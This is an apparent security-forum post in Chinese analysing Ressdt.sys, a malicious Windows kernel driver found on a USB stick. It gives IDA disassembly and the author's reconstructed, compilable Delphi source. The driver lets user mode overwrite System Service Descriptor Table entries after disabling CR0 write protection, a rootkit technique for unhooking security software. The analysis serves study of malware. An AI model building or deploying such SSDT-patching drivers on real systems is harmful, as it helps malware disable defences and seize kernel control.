

# 对某驱动的逆向（src written by Kmdkit4D）

> 原文：[`www.pediy.com/kssd/pediy10/85369.html`](https://www.pediy.com/kssd/pediy10/85369.html)

这应该算是鄙人在看雪的第一帖了，由于鄙人菜鸟无知，可能会有很多错误，还望各位高手多多指教。  
  首先废话下，感谢 DonQuixote 前辈的教导（现在很少看到他了，可能是学业问题？bless），他让我明白了许多的东西，无论是技术还是非技术方面的，其次，感谢 MickeyLan 前辈，MickeyLan 开发的 KmdKit4D 让我这种 Delphi 爱好者也可以在驱动的世界里慢慢摸索，还要感谢女王，没有女王当初的启发，我也不可能开始学习驱动。最后感谢 CSDN Delphi 版的众版主们，虽然他们可能一生也不会和驱动打交道，但他们给了我极大的支持。  
  最后膜拜下“快雪时晴”这位 HUST 的学长（反正我喊谁都是学长，至少现在如此，RT……）兼大牛（众：你有完没完？）  
  进入正题，某同学的 U 盘中毒，某个叫做 Ressdt.sys 的文件入住，虽然看名字都知道是干什么的，但是为了自娱自乐，还是拿出来放到 IDA 里面玩了下。  
  个人比较喜欢上来就看 idata 段，可以对整个文件有个比较大致的理解和认识，可以看到有标准的 stdcall，包括 ProbeForWrite，RtlInitUnicodeString 等，这些都是驱动的重要因素，例如添加符号链接，虽然不是必须的，但这样做可以使用户模式的代码更容易找到驱动，RT。翻了下，在 IoCreateDevice 的 stdcall 里面找到了 KeServiceDescriptorTable 这个东西，大致都知道是如何工作了吧？直接指向 KeServiceDescriptorTable，进行 SSDT 的还原。  
  然后看 text 段，开头的两句汇编证明了这种猜测：  
            mov     eax, offset KeServiceDescriptorTable  
                 mov     eax, \[eax\]  
                 retn  
下面还有一个 Dispatch 例程的建立：  
                 push    ebp  
                 mov     ebp, esp  
                 push    ebx  
                 mov     ebx, \[ebp+arg\_4\]  
                 push    offset Format   ; "DisPatchCreate!"  
                 call    DbgPrint  
ProbeForWrite 的定义在 http://msdn.microsoft.com/en-us/library/ms797108.aspx 处可以看到，比较有趣也比较强大的是，IDA 直接标示了 ProbeForWrite 的参数压栈顺序，以及各个参数：  
           push    4               ; Alignment  
                 push    4               ; Length  
                 mov     eax, \[ebp+Address\]  
                 push    eax             ; Address  
                 call    ProbeForWrite  
下面是一段极其醒目的代码，玩过 SSDT 的都知道是什么了：  
           add     esp, 0Ch  
                 cli //IO 指令，关闭中断，那个啥啥，邪恶的东西开始了  
                 mov     eax, cr0 //修改 CR0 寄存器，修改内核必备良药  
                 and     eax, 0FFFEFFFFh  
                 mov     cr0, eax  
                 mov     eax, \[edi\]//通过 ProbeForRead 获得一个索引，应该是 DeviceIoControl 的方法，如有错误欢迎指正  
                 mov     edx, ebx  
                 add     edx, edx  
                 add     edx, edx  
                 add     edx, \[ebp+var\_10\]  
                 mov     \[edx\], eax  
                 mov     eax, cr0//再改回来，不可写属性  
                 or      eax, 10000h  
                 mov     cr0, eax  
                 sti//开中断  
                 xor     ebx, ebx  
                 jmp     short loc\_103E0  
  Have you ever read the 《sky book》?开个玩笑……忘记说了，DDK 好像也没声明 KeServiceDescriptorTable，需要自己手动添加，恩恩。  
  之后有一些杂乱的代码，比如利用 Short Jump 实现 IoCompleteRequest 的完成请求……这些不再赘述，毕竟不是特别的重点，比如 IoCreateSymbolicLink 创建符号链接，都是用函数，转换起来也很简单，就不多说了。  
  源代码由 dcc32 和 KmdKit4D 一同编译。  
  最后插播一则广告：欢迎访问 http://www.kmdkit4d.net/index.jsp……  
  

代码:

```
unit RESSDT;
interface
uses
  nt\_status, ntoskrnl, native, winioctl, fcall, macros;
function \_DriverEntry(pDriverObject: PDRIVER\_OBJECT; RegistryPath: PUnicodeString): NTSTATUS; stdcall;
implementation
var
  DeviceName1, DeviceName2: UNICODE\_STRING;
const
  IOCTL\_SETPROC = $0022E14B;
function KeServiceDescriptorTable1: PServiceDescriptorEntry;
begin
  Result := PPointer(@KeServiceDescriptorTable)^;
end;
function DispatchCreateClose(p\_DeviceObject: PDEVICE\_OBJECT; p\_Irp: PIRP): NTSTATUS; stdcall;
begin
  DbgPrint('DisPatchCreate!');
  p\_Irp^.IoStatus.Status := STATUS\_SUCCESS;
  p\_Irp^.IoStatus.Information := 0;
  IofCompleteRequest(p\_Irp, IO\_NO\_INCREMENT);
  result := STATUS\_SUCCESS;
end;
function DispatchControl(p\_DeviceObject: PDEVICE\_OBJECT; p\_Irp: PIRP): NTSTATUS; stdcall;
var
  status: NTSTATUS;
  pIrpStack: PIO\_STACK\_LOCATION;
  uIoControlCode: DWORD;
  pInputBuffer, pOutputBuffer: Pointer;
  uOutsize: Cardinal; //uInsize
  uIndex: ULONG;
  pBase: PULONG;
begin
  status := STATUS\_INVALID\_DEVICE\_REQUEST; ;
  pIrpStack := IoGetCurrentIrpStackLocation(p\_Irp); {取 IRP 的 stack location 的指针}
  uIoControlCode := pIrpStack^.Parameters.DeviceIoControl.IoControlCode;
  pInputBuffer := pIrpStack^.Parameters.DeviceIoControl.Type3InputBuffer;
  pOutputBuffer := p\_Irp^.UserBuffer;
//  uInsize := pIrpStack^.Parameters.DeviceIoControl.InputBufferLength;
  uOutsize := pIrpStack^.Parameters.DeviceIoControl.OutputBufferLength;
  DbgPrint('DispatchDeviceControl  Code:%X', uIoControlCode);
  case uIoControlCode of
    IOCTL\_SETPROC:
      begin
        ProbeForRead(pInputBuffer, sizeof(ULONG), sizeof(ULONG));
        ProbeForWrite(pOutputBuffer, sizeof(ULONG), sizeof(ULONG));
        uIndex := PULONG(pInputBuffer)^;
        if (KeServiceDescriptorTable1^.NumberOfServices <= uIndex) then
        begin
          status := STATUS\_INVALID\_PARAMETER;
          Result := status;
          Exit;
        end;
        pBase := KeServiceDescriptorTable1^.ServiceTableBase;
        DbgPrint('0x%x 0x%x', uIndex, PULONG(pInputBuffer)^);
        asm //关中断
        cli
        mov eax,cr0
        and eax,not $10000
        mov cr0,eax
        end;
//                        PULONG(DWORD(pBase) + uIndex)^ := PULONG(pInputBuffer)^;
                          PULONG(DWORD(pBase) + uIndex \* SizeOf(ULONG))^ := PULONG(pInputBuffer)^;
//        Inc(pBase, uIndex);
//        pBase^ := PULONG(pInputBuffer)^;
        asm   //开中断
        mov  eax,cr0
        or   eax,$10000
        mov  cr0,eax
        sti
        end;
        status := STATUS\_SUCCESS;
      end;
  else
    begin
      Result := status;
      Exit;
    end;
  end;
  if status = STATUS\_SUCCESS then
    p\_Irp^.IoStatus.Information := uOutsize
  else
    p\_Irp^.IoStatus.Information := 0;
  p\_Irp^.IoStatus.Status := status;
  IoCompleteRequest(p\_Irp, IO\_NO\_INCREMENT);
  Result := status;
end;
procedure DriverUnload(p\_DriverObject: PDRIVER\_OBJECT); stdcall;
begin
  if IoDeleteSymbolicLink(@DeviceName2) <> STATUS\_SUCCESS then
    DbgPrint('DeleteSymbolicLink Fail!');
  IoDeleteDevice(p\_DriverObject^.DeviceObject);
end;
function \_DriverEntry(pDriverObject: PDRIVER\_OBJECT; RegistryPath: PUnicodeString): NTSTATUS; stdcall;
var
  status: NTSTATUS;
  pDeviceObject: TDeviceObject;
begin
  asm
  pushad
  xor eax, ebx
  sub ebx, ecx
  add ecx, edx
  xor ebx, eax
  popad
  end;
  status := STATUS\_DEVICE\_CONFIGURATION\_ERROR;
  RtlInitUnicodeString(DeviceName1, '\\Device\\RESSDT');
  RtlInitUnicodeString(DeviceName2, '\\??\\RESSDTDOS');
  if (IoCreateDevice(pDriverObject, 0, @DeviceName1, FILE\_DEVICE\_UNKNOWN, 0, FALSE, pDeviceObject) = STATUS\_SUCCESS) then
  begin
    if (IoCreateSymbolicLink(@DeviceName2, @DeviceName1) = STATUS\_SUCCESS) then
    begin
      pDriverObject^.MajorFunction\[IRP\_MJ\_CREATE\] := @DispatchCreateClose;
      pDriverObject^.MajorFunction\[IRP\_MJ\_CLOSE\] := @DispatchCreateClose;
      pDriverObject^.MajorFunction\[IRP\_MJ\_DEVICE\_CONTROL\] := @DispatchControl;
      pDriverObject^.DriverUnload := @DriverUnload;
      status := STATUS\_SUCCESS;
    end else
    begin
      DbgPrint('IoCreateSymbolicLink fail!');
      IoDeleteDevice(@pDeviceObject);
    end;
  end else
    DbgPrint('IoCreateDevice Fail!');
  result := status;
end;
end.

```

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || src.rar  
 |